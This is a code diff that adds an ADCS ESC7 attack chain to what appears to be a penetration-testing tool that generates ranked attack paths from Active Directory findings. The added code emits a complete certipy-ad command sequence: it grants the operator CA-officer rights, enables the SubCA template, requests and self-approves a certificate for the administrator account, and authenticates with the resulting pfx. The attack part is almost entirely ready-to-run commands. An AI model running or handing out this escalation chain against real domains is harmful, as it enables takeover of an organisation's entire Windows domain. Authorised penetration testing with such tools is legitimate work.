@@ -1560,6 +1560,46 @@ def run(report, store, ui=None):
                     f"-template '{_tpl_name}' "
                     f"-configuration '{_tpl_name}.json' -dc-ip {_dc_esc}",
                 ], src=tpl["src"], line=tpl["line"]))
+        # iter-119: R-ADCS-ESC7 - CA management ACL (ManageCA/ManageCertificates)
+        # grants the operator officer-level control over the CA itself. Canonical
+        # exploit re-enables the disabled-by-default SubCA template (which is
+        # ESC1-vulnerable by design), requests a cert against it (CA denies but
+        # returns a request-id), then the operator issues the request as CA
+        # officer and retrieves the pfx. Emit as a distinct chain because the
+        # command sequence is 4 steps, not 1.
+        _emitted_esc7 = set()
+        for tpl in e.cert_templates:
+            if tpl["lab_only"]:
+                continue
+            if "ESC7" not in tpl["esc"]:
+                continue
+            _ca7 = tpl["ca"] or "<CA>"
+            if _ca7 in _emitted_esc7:
+                continue
+            _emitted_esc7.add(_ca7)
+            chains.append(Chain("R-ADCS-ESC7", "ADCS ESC7 -> CA officer -> SubCA cert",
+                f"ESC7 CA '{_ca7}' - operator has ManageCA/ManageCertificates",
+                crit=9, conf=0.85, ready=1.2, prox=0.9,      # score 8.26
+                commands=[
+                    f"# 1. add self as CA officer (ManageCA right):",
+                    f"certipy-ad ca -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
+                    f"-ca '{_ca7}' -add-officer '{_disp_ac}' -dc-ip {_dc_esc}",
+                    f"# 2. enable the disabled-by-default SubCA template:",
+                    f"certipy-ad ca -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
+                    f"-ca '{_ca7}' -enable-template SubCA -dc-ip {_dc_esc}",
+                    f"# 3. request cert against SubCA (CA denies, prints "
+                    f"request-id in output):",
+                    f"certipy-ad req -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
+                    f"-ca '{_ca7}' -template SubCA "
+                    f"-upn 'administrator@{_dom_esc}' -dc-ip {_dc_esc}",
+                    f"# 4. approve the denied request as CA officer, then "
+                    f"retrieve:",
+                    f"certipy-ad ca -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
+                    f"-ca '{_ca7}' -issue-request <request-id> -dc-ip {_dc_esc}",
+                    f"certipy-ad req -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
+                    f"-ca '{_ca7}' -retrieve <request-id> -dc-ip {_dc_esc}",
+                    f"certipy-ad auth -pfx administrator.pfx -dc-ip {_dc_esc}",
+                ], src=tpl["src"], line=tpl["line"]))
 
     # SAM/SYSTEM/SECURITY triad in one dir -> local secretsdump (no network).
     # iter-13: conf=1.0 was 'command will succeed', but conf encodes 'likelihood
